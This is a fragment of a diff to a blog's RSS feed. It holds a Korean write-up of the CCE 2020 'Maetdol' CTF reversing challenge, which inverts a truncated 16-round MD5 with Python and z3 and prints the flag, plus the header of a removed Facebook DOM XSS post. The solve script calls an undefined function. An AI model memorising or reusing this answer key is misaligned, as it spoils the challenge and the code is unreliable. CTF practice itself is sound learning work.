+&lt;/p&gt;&lt;figure id=&quot;72310cea-e874-4549-b18d-32c317296cfc&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb10.png&quot;&gt;&lt;img style=&quot;width:559px&quot; src=&quot;/assets/202010/202010_qb10.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;3af672b5-d337-440d-b901-2fe58f0b73cc&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb11.png&quot;&gt;&lt;img style=&quot;width:521px&quot; src=&quot;/assets/202010/202010_qb11.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;c6a3c6d9-8c1e-4388-b133-818c1981ad3f&quot; class=&quot;&quot;&gt;이후 저장된 배열을 8바이트 단위로 더하여 저장한다.&lt;/p&gt;&lt;p id=&quot;5c4a88b7-d035-484f-8df5-78c7cf19af09&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;45aedf7a-9ed5-4430-a0a8-b509b5d7d225&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb12.png&quot;&gt;&lt;img style=&quot;width:805px&quot; src=&quot;/assets/202010/202010_qb12.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;43c43e4e-6ef1-4106-8ee6-1b1bc53c30c5&quot; class=&quot;&quot;&gt;그리고 Hash 함수로 추정되는 sub_403634를 호출하고, 그 결과 Hash를 저장한다.&lt;/p&gt;&lt;p id=&quot;06bcb26d-04fa-456f-becc-24d49b714d9d&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;bcc11c35-e8ef-4dc8-9445-9f4c11edd6ba&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb13.png&quot;&gt;&lt;img style=&quot;width:287px&quot; src=&quot;/assets/202010/202010_qb13.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;25dc54c0-3826-4249-a43d-79712369dc73&quot; class=&quot;&quot;&gt;그리고 처음 저장된 6개의 Hash와 비교하는 것으로 추정된다.&lt;/p&gt;&lt;p id=&quot;817c87a1-13dd-4245-b5b1-cc82cea4d582&quot; class=&quot;&quot;&gt;모두 일치할 경우 해당 입력 값이 Flag일 것이다.&lt;/p&gt;&lt;p id=&quot;7f267fd0-a612-49b1-a32b-8b672afd28ba&quot; class=&quot;&quot;&gt;이제 Hash 함수로 추정되는 sub_403634를 분석해야한다.&lt;/p&gt;&lt;p id=&quot;c6ffeb57-0dd6-47a9-b42e-35bd5023ec79&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;6bdf6755-8a35-474d-a0f2-ff7d118af966&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb14.png&quot;&gt;&lt;img style=&quot;width:729px&quot; src=&quot;/assets/202010/202010_qb14.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;76df4756-ab29-4af7-b134-46ca87decac0&quot; class=&quot;&quot;&gt;sub_403634 함수는 위와 같이 동작한다. 
+&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;strong&gt;&lt;em&gt;(무언가 복잡한 식이 많고, 이미 존재하는 함수처럼 보일 때는 구글 검색해보는 것이 좋다.)&lt;/em&gt;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;&lt;p id=&quot;8ee68270-3689-4d65-bd3b-af8e520e8da1&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;a8fa28d7-4b3e-4f9a-bd93-35ebba38d51e&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb15.png&quot;&gt;&lt;img style=&quot;width:857px&quot; src=&quot;/assets/202010/202010_qb15.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;478f49a7-2f0f-486e-800e-c0eed76e5bb1&quot; class=&quot;&quot;&gt;함수 시작에서 사용되는 값을 검색하였다.&lt;/p&gt;&lt;p id=&quot;44a7f68c-f0a1-4d82-8f27-2b2ecb20e405&quot; class=&quot;&quot;&gt;SHA1과 MD5에 대한 결과가 보이며 비교하는 Hash의 길이를 보았을 때, MD5로 추정된다.&lt;/p&gt;&lt;p id=&quot;7aa73ba2-4f41-4482-9ec5-c209463cc1fa&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;993288b6-5523-432e-81da-406f25bdaec5&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb16.png&quot;&gt;&lt;img style=&quot;width:492px&quot; src=&quot;/assets/202010/202010_qb16.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;95f4acd2-0ebe-4c17-a84b-a22019b8cf2a&quot; class=&quot;&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/MD5&quot;&gt;Wikipedia&lt;/a&gt;에서 MD5 의사 코드를 발견하였는데, sub_403634와 아주 동일한 형태를 띄고 있다.&lt;/p&gt;&lt;p id=&quot;66d42cc8-eac0-461d-ba43-abae06d22d6f&quot; class=&quot;&quot;&gt;sub_403634는 MD5 Hash 함수임을 알 수 있다.&lt;/p&gt;&lt;p id=&quot;71c91ea8-57ab-413a-b690-be6618e05efd&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;h3 id=&quot;c1863d4e-b571-4947-a2b1-7bf2f8b8e9cc&quot; class=&quot;&quot;&gt;&amp;quot;그치만&amp;quot;&lt;/h3&gt;&lt;p id=&quot;549bec90-d0d3-407c-b059-c2fbd19d0cdb&quot; class=&quot;&quot;&gt;단방향 함수인 MD5 Hash를 역으로 계산할 방법은 없어보인다.&lt;/p&gt;&lt;p id=&quot;6c86ab65-b804-459a-939d-8254cc412bdc&quot; class=&quot;&quot;&gt;하지만 분명 풀 수 있게 낸 문제이므로, 무언가 해결에 필요한 속임수가 존재할 것이다.
+&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;strong&gt;&lt;em&gt;&amp;quot;그치만... 동적 디버깅이라도 하지 않으면, Hash 값이 이상한지 알 수 없는 걸...&amp;quot;&lt;/em&gt;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;&lt;p id=&quot;63726c85-4e36-4dce-8fd7-ca17a6f5ad33&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;167fc324-b7c1-47f1-a83d-bbd82c612c74&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb17.png&quot;&gt;&lt;img style=&quot;width:417px&quot; src=&quot;/assets/202010/202010_qb17.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;64caffea-c6eb-4a94-b06c-bdcafac1adf8&quot; class=&quot;&quot;&gt;먼저 sub_403634 함수의 인자를 원하는 값으로 넣고, 실제 MD5의 값과 비교하였다.&lt;/p&gt;&lt;p id=&quot;6b67545b-6860-4305-b871-929d257010a9&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;4f7014cd-fd5d-4641-8474-46823e15d90c&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb18.png&quot;&gt;&lt;img style=&quot;width:286px&quot; src=&quot;/assets/202010/202010_qb18.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;7cbe0226-0e6b-4f0f-9add-13db9c62bea5&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb19.png&quot;&gt;&lt;img style=&quot;width:587px&quot; src=&quot;/assets/202010/202010_qb19.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;5af04067-6eee-4f37-a989-1bc454086e4c&quot; class=&quot;&quot;&gt;그 결과, 알던 것과는 너무나도 다른 내용의 무언가가 나왔다.&lt;/p&gt;&lt;p id=&quot;86e419cf-bee5-4ff5-b704-20065f1f1cc7&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;28b82142-4aef-4b63-81ba-84983728cedd&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb20.png&quot;&gt;&lt;img style=&quot;width:300px&quot; src=&quot;/assets/202010/202010_qb20.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;8849b20b-3543-4e24-89ee-d5a161b7a84a&quot; class=&quot;&quot;&gt;64회 수행되는 위 &lt;a href=&quot;https://en.wikipedia.org/wiki/MD5#Algorithm&quot;&gt;MD5 알고리즘&lt;/a&gt;의 결과가 저장되는 곳과, 반복문이 끝나는 지점을 확인했다.&lt;/p&gt;&lt;p id=&quot;9cdaea1e-c671-418f-b3c7-20ecec42d5c5&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;32f89e48-3f1e-4a45-b097-7e0b3d168bd4&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb21.png&quot;&gt;&lt;img style=&quot;width:694px&quot; src=&quot;/assets/202010/202010_qb21.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;dc87d0df-ffd6-4f78-987a-32d784a80270&quot; class=&quot;&quot;&gt;실제 MD5 Hash의 연산 중간 값 64개와, 마지막 연산의 결과를 비교해본다.&lt;/p&gt;&lt;p id=&quot;dc08e042-286e-476a-bf94-d8404d2daf1c&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;b91544da-b764-4bc8-8cb8-ab0e243c580e&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb22.png&quot;&gt;&lt;img style=&quot;width:476px&quot; src=&quot;/assets/202010/202010_qb22.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;b9364710-c3a0-4ea8-ad1b-e657cdf0aabf&quot; class=&quot;&quot;&gt;64번 반복되어야 할 연산이, 기묘하게도 16번만 반복하고 끝난다.&lt;/p&gt;&lt;p id=&quot;ca615f83-4077-461d-bdf9-a016ac2720fe&quot; class=&quot;&quot;&gt;&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;em&gt;&lt;strong&gt;&amp;quot;대체 무슨 &lt;/strong&gt;&lt;/em&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;em&gt;&lt;strong&gt;&lt;a href=&quot;https://people.search.naver.com/search.naver?where=nexearch&amp;amp;sm=tab_ppn&amp;amp;query=%EB%85%B8%EC%82%AC%EC%97%B0&amp;amp;os=96492&amp;amp;ie=utf8&amp;amp;key=PeopleService&quot;&gt;사연&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;em&gt;&lt;strong&gt;이..? 취재팀은 급하게  반복문 조건으로 발길을 돌렸다.&amp;quot;&lt;/strong&gt;&lt;/em&gt;&lt;/mark&gt;&lt;/p&gt;&lt;p id=&quot;32e4a408-1525-4e31-86e2-52ade25bb3a3&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;6341b7b2-c5d7-471c-806d-d9e052297318&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb23.png&quot;&gt;&lt;img style=&quot;width:847px&quot; src=&quot;/assets/202010/202010_qb23.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;9e2767d5-2319-48a9-b555-2bb133cfd3b2&quot; class=&quot;&quot;&gt;반복문 조건을 확인해보니, 본래 64회 반복해야할 내용이 16회로 달라져있다.&lt;/p&gt;&lt;p id=&quot;a037b813-f416-41f9-bbf8-7dac720b18a0&quot; class=&quot;&quot;&gt;보고도 믿기지 않아 어려번 재실행해보았지만, 16회 반복으로 되어있었다.&lt;/p&gt;&lt;p id=&quot;31b52f86-56d3-4673-ab1a-bf15db3080eb&quot; class=&quot;&quot;&gt;UPX 패커의 &amp;#x27;-d&amp;#x27; 옵션 결과와 실행하여 Unpack 된 내용이 다르도록, 특정 속임수가 있는 것 같다.&lt;/p&gt;&lt;p id=&quot;4c7be583-82db-404c-84eb-a4bd4ad6d4e2&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;h3 id=&quot;51ecf720-e1ed-4da0-96f2-179573257631&quot; class=&quot;&quot;&gt;역연산&lt;/h3&gt;&lt;figure id=&quot;e4454cb8-1f86-4f05-8200-8e79dba46ef9&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb24.png&quot;&gt;&lt;img style=&quot;width:437px&quot; src=&quot;/assets/202010/202010_qb24.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;96959890-422d-4450-97c0-5f990e72cb97&quot; class=&quot;&quot;&gt;16회만 반복 연산할 경우, F값이 정해지는 조건은 일정해진다.&lt;/p&gt;&lt;p id=&quot;8c7a7017-62db-40c6-b49a-ba3071620805&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;c9ed5c50-c9ee-4d57-84a3-a6fd78148053&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb25.png&quot;&gt;&lt;img style=&quot;width:341px&quot; src=&quot;/assets/202010/202010_qb25.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;d7a2329a-5302-43a4-b6a6-6059b0b11ae9&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb26.png&quot;&gt;&lt;img style=&quot;width:523px&quot; src=&quot;/assets/202010/202010_qb26.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;8e1a5eb6-d740-4f3a-a341-cecb337c09fe&quot; class=&quot;&quot;&gt;연산에 사용되는 M[g]의 경우, 위와 같은 형태로 구성되며 4바이트 단위로 쓰인다.&lt;/p&gt;&lt;p id=&quot;65b2b412-93cc-4aa1-9ce0-c281efc22b95&quot; class=&quot;&quot;&gt;중간에 사용되는 K, s는 고정된 참조 값이다.&lt;/p&gt;&lt;p id=&quot;0272f7e0-9a16-4535-aab3-fdfc9005e1e4&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;figure id=&quot;b1423057-0ca4-411e-bd5d-c5a59a78c44d&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/202010/202010_qb27.png&quot;&gt;&lt;img style=&quot;width:1292px&quot; src=&quot;/assets/202010/202010_qb27.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;142c3ad6-0f81-42f7-be3a-264997f6a7a5&quot; class=&quot;&quot;&gt;&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;em&gt;&lt;strong&gt; &amp;quot; 1/4 밖에 안남은 MD5를 보았다. 웅장하게 코드를 수호하던 그 MD5 맞나..?&amp;quot;&lt;/strong&gt;&lt;/em&gt;&lt;/mark&gt;&lt;/p&gt;&lt;p id=&quot;65bdca73-2119-4a99-a208-6ede859e4f04&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;pre id=&quot;66b30909-380d-4da6-ae04-4cd69dd60ed4&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;def md5_custom(buf):
+    a0 = 0x67452301   # A
+    b0 = 0xefcdab89   # B
+    c0 = 0x98badcfe   # C
+    d0 = 0x10325476   # D
+
+    data = [buf &amp;amp; 0xFFFFFFFF, (buf &amp;gt;&amp;gt; 32) &amp;amp; 0xFFFFFFFF, 0x80, 0, 
+            0, 0, 0, 0,
+            0, 0, 0, 0,
+            0, 0, 0x40, 0  ]
+    
+    A, B, C, D = a0, b0, c0, d0
+    for i in range(16):
+        F = ((B &amp;amp; C) | (D &amp;amp; (~B))) &amp;amp; 0xFFFFFFFF
+        tmp = (A + F + K[i] + data[i]) &amp;amp; 0xFFFFFFFF
+        new_B = (B + ROL(tmp, R[i])) &amp;amp; 0xFFFFFFFF
+        A, B, C, D = D, new_B, B, C
+
+    a0 = (a0 + A) &amp;amp; 0xFFFFFFFF
+    b0 = (b0 + B) &amp;amp; 0xFFFFFFFF
+    c0 = (c0 + C) &amp;amp; 0xFFFFFFFF
+    d0 = (d0 + D) &amp;amp; 0xFFFFFFFF
+
+    return [a0, b0, c0, d0]&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;be2412a7-a2bc-446a-943c-764754d7b687&quot; class=&quot;&quot;&gt;위 내용을 토대로 4등분 된 MD5 함수를 구현하였다.&lt;/p&gt;&lt;p id=&quot;a88b1aaf-18c8-46d7-9dbd-30bf285063ed&quot; class=&quot;&quot;&gt;8바이트 입력 값을 제외한 나머지 연산에 필요한 값(&lt;code&gt;data[2] ~ data[16], K, R&lt;/code&gt;)을 모두 알고 있다.&lt;/p&gt;&lt;p id=&quot;7c1dd9d3-d9f5-4de8-9d6c-f827cdd25e55&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;pre id=&quot;c6a8d970-aef7-457c-9fb6-60513261649f&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;def rev_md5_custom(result):
+    A = (result[0] - 0x67452301) &amp;amp; 0xFFFFFFFF
+    B = (result[1] - 0xefcdab89) &amp;amp; 0xFFFFFFFF
+    C = (result[2] - 0x98badcfe) &amp;amp; 0xFFFFFFFF
+    D = (result[3] - 0x10325476) &amp;amp; 0xFFFFFFFF
+
+    data = [1, 1, 0x80, 0, 
+            0, 0, 0, 0,
+            0, 0, 0, 0,
+            0, 0, 0x40, 0]
+		&amp;quot;&amp;quot;&amp;quot;
+		F &amp;lt;= ((B &amp;amp; C) | (D &amp;amp; (~B)))
+		new_A &amp;lt;= D
+		new_B &amp;lt;= B + ROL( (A + F + K[i] + data[i]), R[i] )
+		new_C &amp;lt;= B
+		new_D &amp;lt;= C
+		&amp;quot;&amp;quot;&amp;quot;
+    for i in range(15, 1, -1):
+        orgD = A
+        orgB = C
+        orgC = D
+        tmp = ROR(B - C, R[i])
+
+        F = ((orgB &amp;amp; orgC) | (orgD &amp;amp; (~orgB)))
+        orgA = tmp - F - K[i] - data[i]
+        orgA &amp;amp;= 0xFFFFFFFF
+
+        A,B,C,D = orgA, orgB, orgC, orgD&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;cc682149-3331-4cf2-9827-6ae394e918c8&quot; class=&quot;&quot;&gt;따라서, 역연산을 통해 4등분 된 MD5 함수의 &lt;strong&gt;&amp;quot;2번째 반복문 중간 결과(&lt;/strong&gt;&lt;strong&gt;&lt;code&gt;A,B,C,D&lt;/code&gt;&lt;/strong&gt;&lt;strong&gt;)&amp;quot;&lt;/strong&gt;를 알아낼 수 있다.&lt;/p&gt;&lt;p id=&quot;3a1df67c-c32a-46fe-b299-f3deb0075916&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;pre id=&quot;b08f5a07-8805-4772-93af-124b928c1860&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;A = 0x67452301
+B = 0xEFCDAB89
+C = 0x98BADCFE
+D = 0x10325476
+
+#i : 0
+F1 = ((B &amp;amp; C) | (D &amp;amp; (~B))) &amp;amp; 0xFFFFFFFF
+tmp = (A + F1 + K[0] + data[0])
+new_B1 = (B + ROL(tmp, R[0])) &amp;amp; 0xFFFFFFFF
+A, B, C, D = D, new_B, B, C
+#A1 : D
+#B1 : new_B1
+#C1 : B
+#D1 : C
+
+#i : 1
+F2 = ((new_B &amp;amp; B) | (C &amp;amp; (~new_B))) &amp;amp; 0xFFFFFFFF
+#   ((B1    &amp;amp; C1)|(D1 &amp;amp; (~B1)))    &amp;amp; 0xFFFFFFFF
+tmp = (D + F2 + K[1] + data[1])
+#    (A1 + F + K[1] + data[1])
+new_B2 = (new_B1 + ROL(tmp, R[1])) &amp;amp; 0xFFFFFFFF
+A, B, C, D = D, new_B, B, C
+#A2 : C
+#B2 : &lt;strong&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;new_B2&lt;/mark&gt;&lt;/strong&gt; = (&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;new_B1 &lt;/strong&gt;&lt;/mark&gt;+ ROL((D + ((&lt;strong&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;new_B&lt;/mark&gt;&lt;/strong&gt; &amp;amp; B)|(C &amp;amp; (~&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;new_B&lt;/strong&gt;&lt;/mark&gt;))) + K[1] + &lt;mark class=&quot;highlight-purple&quot;&gt;&lt;strong&gt;data[1]&lt;/strong&gt;&lt;/mark&gt;), R[1]))
+#C2 : &lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;new_B1&lt;/strong&gt;&lt;/mark&gt; = (B + ROL((A + &lt;mark class=&quot;highlight-teal&quot;&gt;&lt;strong&gt;((B &amp;amp; C) | (D &amp;amp; (~B)))&lt;/strong&gt;&lt;/mark&gt; + K[0] + &lt;strong&gt;&lt;mark class=&quot;highlight-purple&quot;&gt;data[0]&lt;/mark&gt;&lt;/strong&gt;), R[0]))
+#D2 : B&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;246c8cd2-6aa8-453c-8527-02faccf99986&quot; class=&quot;&quot;&gt;&lt;strong&gt;&amp;quot;2번째 반복문 중간 결과(&lt;/strong&gt;&lt;strong&gt;&lt;code&gt;A,B,C,D&lt;/code&gt;&lt;/strong&gt;&lt;strong&gt;)&amp;quot;&lt;/strong&gt;는 위와 같다.&lt;/p&gt;&lt;p id=&quot;c807151a-1d25-436b-a98b-9cc678165c8e&quot; class=&quot;&quot;&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;code&gt;new_B1&lt;/code&gt;&lt;/mark&gt;의 역연산을 통해서 첫번째 입력 값 &lt;mark class=&quot;highlight-purple&quot;&gt;&lt;code&gt;data[0]&lt;/code&gt;&lt;/mark&gt;을 구할 수 있다.&lt;/p&gt;&lt;p id=&quot;f63dfbbc-0ff7-4315-9f96-624277e9cf8c&quot; class=&quot;&quot;&gt;이후 &lt;mark class=&quot;highlight-blue&quot;&gt;&lt;code&gt;new_B1&lt;/code&gt;&lt;/mark&gt;을 통해 &lt;mark class=&quot;highlight-pink&quot;&gt;&lt;code&gt;new_B2&lt;/code&gt;&lt;/mark&gt;의 역연산이 가능해지고, &lt;mark class=&quot;highlight-purple&quot;&gt;&lt;code&gt;data[1]&lt;/code&gt;&lt;/mark&gt;을 구할 수 있게 된다.&lt;/p&gt;&lt;p id=&quot;f3a2e0b9-e8c4-43d1-8357-2d8067090222&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;h3 id=&quot;63de9e75-53e5-4859-a007-0b70654e57d5&quot; class=&quot;&quot;&gt;문제 풀이 코드&lt;/h3&gt;&lt;pre id=&quot;01d308a2-2ff1-4b35-b9fa-098c238eb4c5&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;from pwn import *
+
+f = open(&amp;quot;Maetdol_unpacked.exe&amp;quot;, &amp;quot;rb&amp;quot;)#UPX Unpacked Binary
+data = f.read()
+f.close()
+
+R,K = [],[]
+tmp = data[0x1C3A0:0x1C3A0+0x100]
+for i in range(0, 0x100, 4):
+    R.append(u32(tmp[i:i+4]))
+    
+tmp = data[0x1C4A0:0x1C4A0+0x100]
+for i in range(0, 0x100, 4):
+    K.append(u32(tmp[i:i+4]))
+    
+def ROL(x, c):
+    x &amp;amp;= 0xFFFFFFFF
+    return ((x &amp;lt;&amp;lt; c) | (x &amp;gt;&amp;gt; (32 - c))) &amp;amp; 0xFFFFFFFF
+
+def ROR(x, c):
+    x &amp;amp;= 0xFFFFFFFF
+    return ((x &amp;gt;&amp;gt; c) | (x &amp;lt;&amp;lt; (32 - c))) &amp;amp; 0xFFFFFFFF
+
+def reverse_md5_custom(res):
+    A = (res[0] - 0x67452301) &amp;amp; 0xFFFFFFFF
+    B = (res[1] - 0xEFCDAB89) &amp;amp; 0xFFFFFFFF
+    C = (res[2] - 0x98BADCFE) &amp;amp; 0xFFFFFFFF
+    D = (res[3] - 0x10325476) &amp;amp; 0xFFFFFFFF
+
+    data = [1, 1, 0x80, 0, 
+            0, 0, 0, 0,
+            0, 0, 0, 0,
+            0, 0, 0x40, 0]
+
+    for i in range(15, 1, -1):
+        orgD = A
+        orgB = C
+        orgC = D
+        to_rotate = ROR(B - C, R[i])
+
+        F = ((orgB &amp;amp; orgC) | (orgD &amp;amp; (~orgB)))
+        orgA = to_rotate - F - K[i] - data[i]
+        orgA &amp;amp;= 0xFFFFFFFF
+
+        A,B,C,D = orgA, orgB, orgC, orgD
+
+
+    x0 = (ROR((C - 0xefcdab89), R[0]) - 0x67452301 - 0x98badcfe - K[0]) &amp;amp; 0xFFFFFFFF
+    F0 = 0x98badcfe
+    new_B = (0xefcdab89 + ROL(0x67452301 + F0 + K[0] + x0, R[0])) &amp;amp; 0xFFFFFFFF
+    
+    F1 = ((new_B &amp;amp; 0xefcdab89) | (0x98badcfe &amp;amp; (~new_B)))
+    x1 = (ROR(B - C, R[1]) - 0x10325476 - F1 - K[1]) &amp;amp; 0xFFFFFFFF
+
+    return (x1 &amp;lt;&amp;lt; 32) + x0
+
+import z3
+
+goal = [[0x3b1d2597, 0xda0fa46a, 0x6d8bbe1c, 0xeef458e9],
+        [0x7f526ea1, 0xf7523f94, 0xe22f7b6f, 0x4c753bd2],
+        [0x80fc359e, 0x09eebdae, 0x8a4834f5, 0x370642cd],
+        [0xbac882bf, 0xb7a23e35, 0xdb1cfff9, 0x994b2ce6],
+        [0x605be09c, 0x418902f1, 0x53808dfb, 0x83c2964f],
+        [0x9c32a2b5, 0x0eee2f36, 0x119dbf2c, 0xd31fb222]]
+
+x = [ z3.BitVec(&amp;#x27;x%i&amp;#x27; % i, 64) for i in range(6)]
+s = z3.Solver()
+s.add(z3.Or(x[0] == 0xB36F83C9609A8EC7, x[0] == 0xB26F83C9609A8EC7))
+#cce2020{M
+
+for i in range(6):
+    sm = x[i] + x[(i + 1) % 6]
+    s.add(sm == rev(goal[i]))
+
+if s.check() == z3.sat:
+    m = s.model()
+    enc = [0] * 6
+    for d in m.decls():
+        if str(d)[0] == &amp;#x27;x&amp;#x27;:
+            enc[int(str(d)[1:])] = int(str(m[d]))
+            
+    enc_s = b&amp;quot;&amp;quot;
+    for i in range(6):
+        enc_s += p64(enc[i])
+
+    dec_s = &amp;quot;&amp;quot;
+    for x in enc_s:
+        dec_s += bin(x)[2:].rjust(8, &amp;quot;0&amp;quot;)
+
+    flag = b&amp;quot;&amp;quot;
+    for i in range(0, len(dec_s), 7):
+        flag += bytes([int(dec_s[i:i+7][::-1], 2)])
+    print(flag)
+		#cce2020{M4r13_Anto1ne773_did_n0t_s4y_l3t_7h3m_eat_c4K3=
+    #cce2020{M4r13_Anto1ne773_did_n0t_s4y_l3t_7h3m_eat_c4K3}&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;e56deb0a-2162-4cea-8d30-5d3ea8dad540&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;p id=&quot;fda0c473-0857-45f1-88d7-6c6d6f3db34b&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;p id=&quot;d13bbcfb-3427-4b72-8442-83bb48184a70&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;p id=&quot;90f729c4-b981-4a1b-b53f-213dc7618cb3&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;p id=&quot;a7638272-88d8-4243-a53d-dd98834a5705&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;p id=&quot;ac7e2726-a585-40de-ae78-be8d8f08ca42&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;p id=&quot;5d2618ab-d06c-4d9e-ac54-48207b3eda38&quot; class=&quot;&quot;&gt;
+&lt;/p&gt;&lt;/div&gt;&lt;/article&gt;&lt;/body&gt;&lt;/html&gt;</description>
+        <pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate>
+        <link>http://202.182.127.225:4000/2020-10-01/CCE-2020-Maetdol_</link>
+        <guid isPermaLink="true">http://202.182.127.225:4000/2020-10-01/CCE-2020-Maetdol_</guid>
+        
+        <category>write-up</category>
+        
+        <category>ctf</category>
         
         
       </item>
@@ -12966,191 +13793,6 @@ ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsysca
         <guid isPermaLink="true">http://202.182.127.225:4000/2020-05-01/memory</guid>
         
         <category>system</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>iframe broker &amp; Story of Facebook DOM XSS</title>
-        <description>&lt;p&gt;라온화이트햇 핵심연구팀 최정수&lt;/p&gt;
-
-&lt;p&gt;이 글은 &lt;a href=&quot;https://vinothkumar.me/&quot;&gt;Vinoth Kumar&lt;/a&gt;가 지난 4월 Facebook의 DOM XSS를 발견하여 제보하고 2만 달러의 포상금을 받은 &lt;a href=&quot;https://vinothkumar.me/20000-facebook-dom-xss/&quot;&gt;게시글&lt;/a&gt;을 번역한 내용이 포함되어 있습니다. 추가로 해당 취약점을 찾기 위해 &lt;a href=&quot;https://vinothkumar.me/&quot;&gt;Vinoth Kumar&lt;/a&gt;가 개발한 Iframe과 Cross Window communications 로그를 쉽게 확인 할 수 있는 크롬 익스텐션을 사용하고 어떻게 적용할 수 있을지 고민했습니다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;iframe-broker&quot;&gt;iframe broker&lt;/h1&gt;
-
-&lt;hr /&gt;
-
